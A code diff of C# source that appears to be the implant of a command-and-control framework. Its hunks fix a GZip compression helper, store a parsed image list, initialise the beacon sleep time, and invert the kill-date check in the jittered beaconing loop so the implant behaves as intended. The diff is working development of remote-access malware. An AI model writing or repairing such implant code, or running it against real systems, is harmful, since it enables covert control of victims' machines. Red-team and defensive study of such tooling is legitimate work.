@@ -209,12 +209,14 @@ public class Program
 
 	static byte[] Compress(byte[] raw)
 	{
-		using (var memory = new MemoryStream())
-		using (var gzip = new GZipStream(memory, CompressionMode.Compress, true))
-		{
-			gzip.Write(raw, 0, raw.Length);
-			return memory.ToArray();
-		}
+    using (MemoryStream memory = new MemoryStream())
+    {
+      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
+      {
+        gzip.Write(raw, 0, raw.Length);
+      }
+      return memory.ToArray();
+    }
 	}
 	
 	static Type LoadSomething(string assemblyQualifiedName)
@@ -257,6 +259,7 @@ public class Program
 		{
 			var stringnewIMGS = _re.Matches(stringIMGS.Replace(",", "")).Cast<Match>().Select(m => m.Value);
 			stringnewIMGS = stringnewIMGS.Where(m => !string.IsNullOrEmpty(m));
+      _newImgs = stringnewIMGS.ToList();
 		}
 
 		static string RandomString(int length)
@@ -284,8 +287,8 @@ public class Program
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
 		ImgGen.Init(stringIMGS);
-	
-		if (!Int32.TryParse(Sleep, out int beacontime))
+	  int beacontime = 5;
+		if (!Int32.TryParse(Sleep, out beacontime))
 			beacontime = 5;
 	
 		var strOutput = new StringWriter();
@@ -294,7 +297,7 @@ public class Program
 		var output = new StringBuilder();
 		while (!exitvt.WaitOne((int)(beacontime * 1000 * (((new Random()).Next(0, 2) > 0) ? 1.05 : 0.95))))
 		{
-			if (Convert.ToDateTime(KillDate) > DateTime.Now)
+			if (Convert.ToDateTime(KillDate) < DateTime.Now)
 			{
 				exitvt.Set();
 				continue;
